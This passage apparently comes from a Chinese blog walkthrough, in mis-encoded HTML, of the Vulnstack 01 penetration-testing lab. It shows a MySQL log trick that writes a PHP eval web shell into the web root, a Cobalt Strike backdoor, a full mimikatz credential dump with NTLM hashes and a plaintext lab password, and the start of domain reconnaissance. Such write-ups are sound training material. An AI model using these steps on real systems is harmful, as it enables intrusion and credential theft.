src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2017.28.41.png" style="zoom:50%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2017.29.18.png" style="zoom:70%;"><p>é™¤äº†ä½¿ç”¨å‘½ä»¤ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥ç›´æ¥åœ¨UIç•Œé¢ç¼–è¾‘è¿™ä¸ªå‚æ•°ã€‚</p><h3 id="2-3-3-è®¾ç½®æ—¥å¿—æ–‡ä»¶"><a href="#2-3-3-è®¾ç½®æ—¥å¿—æ–‡ä»¶" class="headerlink" title="2.3.3 è®¾ç½®æ—¥å¿—æ–‡ä»¶"></a>2.3.3 è®¾ç½®æ—¥å¿—æ–‡ä»¶</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SET GLOBAL <span class="token assign-left variable">general_log_file</span><span class="token operator">=</span><span class="token string">'C:/phpStudy/www/hack.php'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2017.30.56.png" style="zoom:50%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2017.31.24.png" style="zoom:50%;"><h3 id="2-3-4-å°†æœ¨é©¬å†™å…¥æ—¥å¿—"><a href="#2-3-4-å°†æœ¨é©¬å†™å…¥æ—¥å¿—" class="headerlink" title="2.3.4 å°†æœ¨é©¬å†™å…¥æ—¥å¿—"></a>2.3.4 å°†æœ¨é©¬å†™å…¥æ—¥å¿—</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SELECT <span class="token string">'&lt;?php eval($_POST["sxk"]);?&gt;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2017.33.18.png" style="zoom:50%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2017.34.07.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°æœ¨é©¬å·²ç»å†™å…¥ã€‚</p><h3 id="2-3-5-getshell"><a href="#2-3-5-getshell" class="headerlink" title="2.3.5 getshell"></a>2.3.5 getshell</h3><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2017.35.41.png" style="zoom:40%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2017.36.12.png" style="zoom:50%;"><p>è·å¾—çš„æ˜¯godåŸŸä¸­çš„administratoræƒé™ã€‚</p><h1 id="ä¸‰ã€å†…ç½‘ä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€å†…ç½‘ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€å†…ç½‘ä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€å†…ç½‘ä¿¡æ¯æ”¶é›†</h1><h2 id="3-1-DMZ-webæœåŠ¡å™¨-win7-ä¸Šçº¿CS"><a href="#3-1-DMZ-webæœåŠ¡å™¨-win7-ä¸Šçº¿CS" class="headerlink" title="3.1 DMZ webæœåŠ¡å™¨(win7)ä¸Šçº¿CS"></a>3.1 DMZ webæœåŠ¡å™¨(win7)ä¸Šçº¿CS</h2><p>å…³äºCobaltStrikeçš„å…·ä½“ç”¨æ³•ï¼Œè§æœ¬ç«™ã€ŠCobaltStrikeã€‹ä¸€æ–‡ã€‚</p><h3 id="3-1-1-åˆ›å»ºCSç›‘å¬å™¨"><a href="#3-1-1-åˆ›å»ºCSç›‘å¬å™¨" class="headerlink" title="3.1.1 åˆ›å»ºCSç›‘å¬å™¨"></a>3.1.1 åˆ›å»ºCSç›‘å¬å™¨</h3><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2009.55.24.png" style="zoom:50%;"><h3 id="3-1-2-åˆ›å»ºåé—¨"><a href="#3-1-2-åˆ›å»ºåé—¨" class="headerlink" title="3.1.2 åˆ›å»ºåé—¨"></a>3.1.2 åˆ›å»ºåé—¨</h3><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2009.56.31.png" style="zoom:50%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2009.57.16.png" style="zoom:50%;"><h3 id="3-1-3-æŠ•é€’åé—¨å¹¶ä¸Šçº¿CS"><a href="#3-1-3-æŠ•é€’åé—¨å¹¶ä¸Šçº¿CS" class="headerlink" title="3.1.3 æŠ•é€’åé—¨å¹¶ä¸Šçº¿CS"></a>3.1.3 æŠ•é€’åé—¨å¹¶ä¸Šçº¿CS</h3><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2009.58.16.png" style="zoom:50%;"><p>é€šè¿‡èšå‰‘ä¸Šä¼ åé—¨ç¨‹åºã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2010.00.10.png" style="zoom:70%;"><p>æ‰§è¡Œbackdoor.exeåé—¨ç¨‹åºã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2010.00.44.png" style="zoom:50%;"><p>æˆåŠŸä¸Šçº¿CSã€‚</p><h2 id="3-2-å¤±é™·ä¸»æœºä¿¡æ¯æ”¶é›†"><a href="#3-2-å¤±é™·ä¸»æœºä¿¡æ¯æ”¶é›†" class="headerlink" title="3.2 å¤±é™·ä¸»æœºä¿¡æ¯æ”¶é›†"></a>3.2 å¤±é™·ä¸»æœºä¿¡æ¯æ”¶é›†</h2><h3 id="3-2-1-mimikatzæŠ“å–å“ˆå¸Œ"><a href="#3-2-1-mimikatzæŠ“å–å“ˆå¸Œ" class="headerlink" title="3.2.1 mimikatzæŠ“å–å“ˆå¸Œ"></a>3.2.1 mimikatzæŠ“å–å“ˆå¸Œ</h3><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2010.18.59.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">beacon<span class="token operator">&gt;</span> logonpasswords<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Tasked beacon to run mimikatz's sekurlsa::logonpasswords <span class="token builtin class-name">command</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token function">host</span> called home, sent: <span class="token number">746578</span> bytes<span class="token punctuation">[</span>+<span class="token punctuation">]</span> received output:Authentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">959166</span> <span class="token punctuation">(</span>00000000:000ea2be<span class="token punctuation">)</span>Session           <span class="token builtin class-name">:</span> Interactive from <span class="token number">1</span>User Name         <span class="token builtin class-name">:</span> AdministratorDomain            <span class="token builtin class-name">:</span> GODLogon Server      <span class="token builtin class-name">:</span> OWALogon Time        <span class="token builtin class-name">:</span> <span class="token number">2025</span>/2/13 <span class="token number">18</span>:11:09SID               <span class="token builtin class-name">:</span> S-1-5-21-2952760202-1353902439-2381784089-500msv <span class="token builtin class-name">:</span> <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary * Username <span class="token builtin class-name">:</span> Administrator * Domain   <span class="token builtin class-name">:</span> GOD * LM       <span class="token builtin class-name">:</span> edea194d76c77d87840ac10a764c7362 * NTLM     <span class="token builtin class-name">:</span> 8a963371a63944419ec1adf687bb1be5 * SHA1     <span class="token builtin class-name">:</span> 343f44056ed02360aead5618dd42e4614b5f70cftspkg <span class="token builtin class-name">:</span> * Username <span class="token builtin class-name">:</span> Administrator * Domain   <span class="token builtin class-name">:</span> GOD * Password <span class="token builtin class-name">:</span> hongrisec@2019wdigest <span class="token builtin class-name">:</span> * Username <span class="token builtin class-name">:</span> Administrator * Domain   <span class="token builtin class-name">:</span> GOD * Password <span class="token builtin class-name">:</span> hongrisec@2019kerberos <span class="token builtin class-name">:</span> * Username <span class="token builtin class-name">:</span> Administrator * Domain   <span class="token builtin class-name">:</span> GOD.ORG * Password <span class="token builtin class-name">:</span> hongrisec@2019ssp <span class="token builtin class-name">:</span>credman <span class="token builtin class-name">:</span>Authentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">997</span> <span class="token punctuation">(</span>00000000:000003e5<span class="token punctuation">)</span>Session           <span class="token builtin class-name">:</span> Service from <span class="token number">0</span>User Name         <span class="token builtin class-name">:</span> LOCAL SERVICEDomain            <span class="token builtin class-name">:</span> NT AUTHORITYLogon Server      <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        <span class="token builtin class-name">:</span> <span class="token number">2025</span>/2/13 <span class="token number">18</span>:10:57SID               <span class="token builtin class-name">:</span> S-1-5-19msv <span class="token builtin class-name">:</span>tspkg <span class="token builtin class-name">:</span>wdigest <span class="token builtin class-name">:</span> * Username <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span> * Domain   <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span> * Password <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>kerberos <span class="token builtin class-name">:</span> * Username <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span> * Domain   <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span> * Password <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>ssp <span class="token builtin class-name">:</span>credman <span class="token builtin class-name">:</span>Authentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">996</span> <span class="token punctuation">(</span>00000000:000003e4<span class="token punctuation">)</span>Session           <span class="token builtin class-name">:</span> Service from <span class="token number">0</span>User Name         <span class="token builtin class-name">:</span> STU1$Domain            <span class="token builtin class-name">:</span> GODLogon Server      <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        <span class="token builtin class-name">:</span> <span class="token number">2025</span>/2/13 <span class="token number">18</span>:10:56SID               <span class="token builtin class-name">:</span> S-1-5-20msv <span class="token builtin class-name">:</span> <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary * Username <span class="token builtin class-name">:</span> STU1$ * Domain   <span class="token builtin class-name">:</span> GOD * NTLM     <span class="token builtin class-name">:</span> 0ba7dcdc7f5bef947c985490b99228c1 * SHA1     <span class="token builtin class-name">:</span> e5c0f994e94ef2ac378ddb8c784bfb33dda7927atspkg <span class="token builtin class-name">:</span>wdigest <span class="token builtin class-name">:</span> * Username <span class="token builtin class-name">:</span> STU1$ * Domain   <span class="token builtin class-name">:</span> GOD * Password <span class="token builtin class-name">:</span> <span class="token function">df</span> ee <span class="token number">90</span> <span class="token number">18</span> 9c <span class="token number">48</span> 2d 8a e9 <span class="token number">98</span> <span class="token number">49</span> 06 01 ca d4 7f <span class="token number">79</span> c8 <span class="token number">19</span> 1f ab e2 <span class="token number">63</span> <span class="token number">50</span> 2f <span class="token number">54</span> c9 08 09 3f f0 <span class="token number">49</span> <span class="token number">82</span> <span class="token number">94</span> 6c b1 <span class="token number">86</span> bb <span class="token number">44</span> <span class="token number">57</span> 7c <span class="token number">39</span> <span class="token number">76</span> <span class="token number">46</span> 03 <span class="token number">78</span> c3 e1 a5 <span class="token number">74</span> 02 f8 9c <span class="token number">81</span> b2 5a <span class="token number">12</span> e5 01 b1 <span class="token number">53</span> <span class="token number">18</span> ed 2c 6d 0f <span class="token number">71</span> <span class="token function">dd</span> 7c 7c 00 8a e7 <span class="token number">51</span> <span class="token number">56</span> 5c 3a <span class="token number">11</span> 3a <span class="token number">18</span> b2 f8 <span class="token number">58</span> b4 08 0d <span class="token number">20</span> ca b8 00 <span class="token number">72</span> <span class="token number">27</span> be <span class="token number">71</span> d6 <span class="token number">42</span> 9d fb <span class="token number">13</span> d0 f8 fb f4 5a af <span class="token number">45</span> af <span class="token number">87</span> d7 <span class="token number">20</span> cc 4e <span class="token number">68</span> c9 f9 <span class="token number">67</span> c0 a9 7d <span class="token number">75</span> <span class="token number">66</span> <span class="token number">88</span> 0c 8c 05 c5 <span class="token number">88</span> 1a bd a9 <span class="token number">79</span> 5b <span class="token number">63</span> <span class="token builtin class-name">cd</span> a7 3d <span class="token number">19</span> 9b 4d <span class="token number">93</span> ce <span class="token number">61</span> b9 <span class="token number">68</span> <span class="token number">39</span> 9b 8b bd <span class="token number">53</span> 2e <span class="token number">28</span> 6b 5b <span class="token number">55</span> <span class="token number">21</span> ee 2e <span class="token number">61</span> <span class="token number">59</span> b5 4c <span class="token number">77</span> <span class="token number">49</span> 0e eb cc <span class="token number">92</span> <span class="token number">31</span> <span class="token number">94</span> 5f 3a 0d d5 <span class="token number">61</span> 8f 1f <span class="token number">38</span> <span class="token number">75</span> 0e <span class="token number">70</span> bd fc <span class="token number">99</span> <span class="token number">94</span> a3 <span class="token number">80</span> <span class="token number">95</span> <span class="token number">49</span> b0 b0 <span class="token number">84</span> e5 c6 0a <span class="token number">60</span> d7 <span class="token number">52</span> ac <span class="token number">25</span> <span class="token number">52</span> 2a <span class="token number">62</span> f8 e3 8b 2a <span class="token number">72</span> b2 <span class="token number">53</span> 8d eb f0 ce e6 cf 0d 7a 4b 3b 03 4d 6e <span class="token number">74</span> bb d1 8d <span class="token number">71</span> <span class="token number">32</span> <span class="token number">31</span> 1c 4f 9e b6 f4 <span class="token number">85</span> d8 0d 4b b6 03 kerberos <span class="token builtin class-name">:</span> * Username <span class="token builtin class-name">:</span> stu1$ * Domain   <span class="token builtin class-name">:</span> god.org * Password <span class="token builtin class-name">:</span> <span class="token function">df</span> ee <span class="token number">90</span> <span class="token number">18</span> 9c <span class="token number">48</span> 2d 8a e9 <span class="token number">98</span> <span class="token number">49</span> 06 01 ca d4 7f <span class="token number">79</span> c8 <span class="token number">19</span> 1f ab e2 <span class="token number">63</span> <span class="token number">50</span> 2f <span class="token number">54</span> c9 08 09 3f f0 <span class="token number">49</span> <span class="token number">82</span> <span class="token number">94</span> 6c b1 <span class="token number">86</span> bb <span class="token number">44</span> <span class="token number">57</span> 7c <span class="token number">39</span> <span class="token number">76</span> <span class="token number">46</span> 03 <span class="token number">78</span> c3 e1 a5 <span class="token number">74</span> 02 f8 9c <span class="token number">81</span> b2 5a <span class="token number">12</span> e5 01 b1 <span class="token number">53</span> <span class="token number">18</span> ed 2c 6d 0f <span class="token number">71</span> <span class="token function">dd</span> 7c 7c 00 8a e7 <span class="token number">51</span> <span class="token number">56</span> 5c 3a <span class="token number">11</span> 3a <span class="token number">18</span> b2 f8 <span class="token number">58</span> b4 08 0d <span class="token number">20</span> ca b8 00 <span class="token number">72</span> <span class="token number">27</span> be <span class="token number">71</span> d6 <span class="token number">42</span> 9d fb <span class="token number">13</span> d0 f8 fb f4 5a af <span class="token number">45</span> af <span class="token number">87</span> d7 <span class="token number">20</span> cc 4e <span class="token number">68</span> c9 f9 <span class="token number">67</span> c0 a9 7d <span class="token number">75</span> <span class="token number">66</span> <span class="token number">88</span> 0c 8c 05 c5 <span class="token number">88</span> 1a bd a9 <span class="token number">79</span> 5b <span class="token number">63</span> <span class="token builtin class-name">cd</span> a7 3d <span class="token number">19</span> 9b 4d <span class="token number">93</span> ce <span class="token number">61</span> b9 <span class="token number">68</span> <span class="token number">39</span> 9b 8b bd <span class="token number">53</span> 2e <span class="token number">28</span> 6b 5b <span class="token number">55</span> <span class="token number">21</span> ee 2e <span class="token number">61</span> <span class="token number">59</span> b5 4c <span class="token number">77</span> <span class="token number">49</span> 0e eb cc <span class="token number">92</span> <span class="token number">31</span> <span class="token number">94</span> 5f 3a 0d d5 <span class="token number">61</span> 8f 1f <span class="token number">38</span> <span class="token number">75</span> 0e <span class="token number">70</span> bd fc <span class="token number">99</span> <span class="token number">94</span> a3 <span class="token number">80</span> <span class="token number">95</span> <span class="token number">49</span> b0 b0 <span class="token number">84</span> e5 c6 0a <span class="token number">60</span> d7 <span class="token number">52</span> ac <span class="token number">25</span> <span class="token number">52</span> 2a <span class="token number">62</span> f8 e3 8b 2a <span class="token number">72</span> b2 <span class="token number">53</span> 8d eb f0 ce e6 cf 0d 7a 4b 3b 03 4d 6e <span class="token number">74</span> bb d1 8d <span class="token number">71</span> <span class="token number">32</span> <span class="token number">31</span> 1c 4f 9e b6 f4 <span class="token number">85</span> d8 0d 4b b6 03 ssp <span class="token builtin class-name">:</span>credman <span class="token builtin class-name">:</span>Authentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">51748</span> <span class="token punctuation">(</span>00000000:0000ca24<span class="token punctuation">)</span>Session           <span class="token builtin class-name">:</span> UndefinedLogonType from <span class="token number">0</span>User Name         <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Domain            <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Server      <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        <span class="token builtin class-name">:</span> <span class="token number">2025</span>/2/13 <span class="token number">18</span>:10:56SID               <span class="token builtin class-name">:</span> msv <span class="token builtin class-name">:</span> <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary * Username <span class="token builtin class-name">:</span> STU1$ * Domain   <span class="token builtin class-name">:</span> GOD * NTLM     <span class="token builtin class-name">:</span> 0ba7dcdc7f5bef947c985490b99228c1 * SHA1     <span class="token builtin class-name">:</span> e5c0f994e94ef2ac378ddb8c784bfb33dda7927atspkg <span class="token builtin class-name">:</span>wdigest <span class="token builtin class-name">:</span>kerberos <span class="token builtin class-name">:</span>ssp <span class="token builtin class-name">:</span>credman <span class="token builtin class-name">:</span>Authentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">999</span> <span class="token punctuation">(</span>00000000:000003e7<span class="token punctuation">)</span>Session           <span class="token builtin class-name">:</span> UndefinedLogonType from <span class="token number">0</span>User Name         <span class="token builtin class-name">:</span> STU1$Domain            <span class="token builtin class-name">:</span> GODLogon Server      <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        <span class="token builtin class-name">:</span> <span class="token number">2025</span>/2/13 <span class="token number">18</span>:10:56SID               <span class="token builtin class-name">:</span> S-1-5-18msv <span class="token builtin class-name">:</span>tspkg <span class="token builtin class-name">:</span>wdigest <span class="token builtin class-name">:</span> * Username <span class="token builtin class-name">:</span> STU1$ * Domain   <span class="token builtin class-name">:</span> GOD * Password <span class="token builtin class-name">:</span> <span class="token function">df</span> ee <span class="token number">90</span> <span class="token number">18</span> 9c <span class="token number">48</span> 2d 8a e9 <span class="token number">98</span> <span class="token number">49</span> 06 01 ca d4 7f <span class="token number">79</span> c8 <span class="token number">19</span> 1f ab e2 <span class="token number">63</span> <span class="token number">50</span> 2f <span class="token number">54</span> c9 08 09 3f f0 <span class="token number">49</span> <span class="token number">82</span> <span class="token number">94</span> 6c b1 <span class="token number">86</span> bb <span class="token number">44</span> <span class="token number">57</span> 7c <span class="token number">39</span> <span class="token number">76</span> <span class="token number">46</span> 03 <span class="token number">78</span> c3 e1 a5 <span class="token number">74</span> 02 f8 9c <span class="token number">81</span> b2 5a <span class="token number">12</span> e5 01 b1 <span class="token number">53</span> <span class="token number">18</span> ed 2c 6d 0f <span class="token number">71</span> <span class="token function">dd</span> 7c 7c 00 8a e7 <span class="token number">51</span> <span class="token number">56</span> 5c 3a <span class="token number">11</span> 3a <span class="token number">18</span> b2 f8 <span class="token number">58</span> b4 08 0d <span class="token number">20</span> ca b8 00 <span class="token number">72</span> <span class="token number">27</span> be <span class="token number">71</span> d6 <span class="token number">42</span> 9d fb <span class="token number">13</span> d0 f8 fb f4 5a af <span class="token number">45</span> af <span class="token number">87</span> d7 <span class="token number">20</span> cc 4e <span class="token number">68</span> c9 f9 <span class="token number">67</span> c0 a9 7d <span class="token number">75</span> <span class="token number">66</span> <span class="token number">88</span> 0c 8c 05 c5 <span class="token number">88</span> 1a bd a9 <span class="token number">79</span> 5b <span class="token number">63</span> <span class="token builtin class-name">cd</span> a7 3d <span class="token number">19</span> 9b 4d <span class="token number">93</span> ce <span class="token number">61</span> b9 <span class="token number">68</span> <span class="token number">39</span> 9b 8b bd <span class="token number">53</span> 2e <span class="token number">28</span> 6b 5b <span class="token number">55</span> <span class="token number">21</span> ee 2e <span class="token number">61</span> <span class="token number">59</span> b5 4c <span class="token number">77</span> <span class="token number">49</span> 0e eb cc <span class="token number">92</span> <span class="token number">31</span> <span class="token number">94</span> 5f 3a 0d d5 <span class="token number">61</span> 8f 1f <span class="token number">38</span> <span class="token number">75</span> 0e <span class="token number">70</span> bd fc <span class="token number">99</span> <span class="token number">94</span> a3 <span class="token number">80</span> <span class="token number">95</span> <span class="token number">49</span> b0 b0 <span class="token number">84</span> e5 c6 0a <span class="token number">60</span> d7 <span class="token number">52</span> ac <span class="token number">25</span> <span class="token number">52</span> 2a <span class="token number">62</span> f8 e3 8b 2a <span class="token number">72</span> b2 <span class="token number">53</span> 8d eb f0 ce e6 cf 0d 7a 4b 3b 03 4d 6e <span class="token number">74</span> bb d1 8d <span class="token number">71</span> <span class="token number">32</span> <span class="token number">31</span> 1c 4f 9e b6 f4 <span class="token number">85</span> d8 0d 4b b6 03 kerberos <span class="token builtin class-name">:</span> * Username <span class="token builtin class-name">:</span> stu1$ * Domain   <span class="token builtin class-name">:</span> GOD.ORG * Password <span class="token builtin class-name">:</span> <span class="token function">df</span> ee <span class="token number">90</span> <span class="token number">18</span> 9c <span class="token number">48</span> 2d 8a e9 <span class="token number">98</span> <span class="token number">49</span> 06 01 ca d4 7f <span class="token number">79</span> c8 <span class="token number">19</span> 1f ab e2 <span class="token number">63</span> <span class="token number">50</span> 2f <span class="token number">54</span> c9 08 09 3f f0 <span class="token number">49</span> <span class="token number">82</span> <span class="token number">94</span> 6c b1 <span class="token number">86</span> bb <span class="token number">44</span> <span class="token number">57</span> 7c <span class="token number">39</span> <span class="token number">76</span> <span class="token number">46</span> 03 <span class="token number">78</span> c3 e1 a5 <span class="token number">74</span> 02 f8 9c <span class="token number">81</span> b2 5a <span class="token number">12</span> e5 01 b1 <span class="token number">53</span> <span class="token number">18</span> ed 2c 6d 0f <span class="token number">71</span> <span class="token function">dd</span> 7c 7c 00 8a e7 <span class="token number">51</span> <span class="token number">56</span> 5c 3a <span class="token number">11</span> 3a <span class="token number">18</span> b2 f8 <span class="token number">58</span> b4 08 0d <span class="token number">20</span> ca b8 00 <span class="token number">72</span> <span class="token number">27</span> be <span class="token number">71</span> d6 <span class="token number">42</span> 9d fb <span class="token number">13</span> d0 f8 fb f4 5a af <span class="token number">45</span> af <span class="token number">87</span> d7 <span class="token number">20</span> cc 4e <span class="token number">68</span> c9 f9 <span class="token number">67</span> c0 a9 7d <span class="token number">75</span> <span class="token number">66</span> <span class="token number">88</span> 0c 8c 05 c5 <span class="token number">88</span> 1a bd a9 <span class="token number">79</span> 5b <span class="token number">63</span> <span class="token builtin class-name">cd</span> a7 3d <span class="token number">19</span> 9b 4d <span class="token number">93</span> ce <span class="token number">61</span> b9 <span class="token number">68</span> <span class="token number">39</span> 9b 8b bd <span class="token number">53</span> 2e <span class="token number">28</span> 6b 5b <span class="token number">55</span> <span class="token number">21</span> ee 2e <span class="token number">61</span> <span class="token number">59</span> b5 4c <span class="token number">77</span> <span class="token number">49</span> 0e eb cc <span class="token number">92</span> <span class="token number">31</span> <span class="token number">94</span> 5f 3a 0d d5 <span class="token number">61</span> 8f 1f <span class="token number">38</span> <span class="token number">75</span> 0e <span class="token number">70</span> bd fc <span class="token number">99</span> <span class="token number">94</span> a3 <span class="token number">80</span> <span class="token number">95</span> <span class="token number">49</span> b0 b0 <span class="token number">84</span> e5 c6 0a <span class="token number">60</span> d7 <span class="token number">52</span> ac <span class="token number">25</span> <span class="token number">52</span> 2a <span class="token number">62</span> f8 e3 8b 2a <span class="token number">72</span> b2 <span class="token number">53</span> 8d eb f0 ce e6 cf 0d 7a 4b 3b 03 4d 6e <span class="token number">74</span> bb d1 8d <span class="token number">71</span> <span class="token number">32</span> <span class="token number">31</span> 1c 4f 9e b6 f4 <span class="token number">85</span> d8 0d 4b b6 03 ssp <span class="token builtin class-name">:</span>credman <span class="token builtin class-name">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°å…³é”®çš„ç”¨æˆ·å/å¯†ç ä¿¡æ¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> msv <span class="token builtin class-name">:</span> <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary * Username <span class="token builtin class-name">:</span> Administrator * Domain   <span class="token builtin class-name">:</span> GOD * LM       <span class="token builtin class-name">:</span> edea194d76c77d87840ac10a764c7362 * NTLM     <span class="token builtin class-name">:</span> 8a963371a63944419ec1adf687bb1be5 * SHA1     <span class="token builtin class-name">:</span> 343f44056ed02360aead5618dd42e4614b5f70cftspkg <span class="token builtin class-name">:</span> * Username <span class="token builtin class-name">:</span> Administrator * Domain   <span class="token builtin class-name">:</span> GOD * Password <span class="token builtin class-name">:</span> hongrisec@2019wdigest <span class="token builtin class-name">:</span> * Username <span class="token builtin class-name">:</span> Administrator * Domain   <span class="token builtin class-name">:</span> GOD * Password <span class="token builtin class-name">:</span> hongrisec@2019kerberos <span class="token builtin class-name">:</span> * Username <span class="token builtin class-name">:</span> Administrator * Domain   <span class="token builtin class-name">:</span> GOD.ORG * Password <span class="token builtin class-name">:</span> hongrisec@2019<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>è¿™æ®µå†…å®¹å±•ç¤ºäº†ä¸åŒè®¤è¯åè®®ï¼ˆå¦‚ MSVã€TSPKGã€WDigest å’Œ Kerberosï¼‰ä¸‹åŒä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·çš„å‡­è¯ä¿¡æ¯ã€‚å…¶ä¸­ï¼Œ<code>msv</code> éƒ¨åˆ†åŒ…å«äº†å“ˆå¸Œå€¼ï¼Œè€Œ <code>tspkg</code>ã€<code>wdigest</code> å’Œ <code>kerberos</code> éƒ¨åˆ†ç›´æ¥æ˜¾ç¤ºäº†æ˜æ–‡å¯†ç ã€‚</p></blockquote><h2 id="3-3-å†…ç½‘ä¿¡æ¯æ”¶é›†"><a href="#3-3-å†…ç½‘ä¿¡æ¯æ”¶é›†" class="headerlink" title="3.3 å†…ç½‘ä¿¡æ¯æ”¶é›†"></a>3.3 å†…ç½‘ä¿¡æ¯æ”¶é›†</h2><h3 id="3-3-1-åŸŸç”¨æˆ·ä¿¡æ¯æ”¶é›†"><a href="#3-3-1-åŸŸç”¨æˆ·ä¿¡æ¯æ”¶é›†" class="headerlink" title="3.3.1 åŸŸç”¨æˆ·ä¿¡æ¯æ”¶é›†"></a>3.3.1 åŸŸç”¨æˆ·ä¿¡æ¯æ”¶é›†</h3><p>CSæ‰§è¡Œnet viewï¼š</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2010.29.12.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°å½“å‰åŸŸGODä¸­æœ‰ä¸‰å°ä¸»æœºï¼Œå·²ç»æ‹¿ä¸‹çš„172.20.10.2ï¼Œ192.168ç½‘æ®µä¸‹çš„192.168.93.2å’Œ192.168.93.10ã€‚</p><blockquote><h4 id="net-viewå‘½ä»¤"><a href="#net-viewå‘½ä»¤" class="headerlink" title="net viewå‘½ä»¤"></a>net 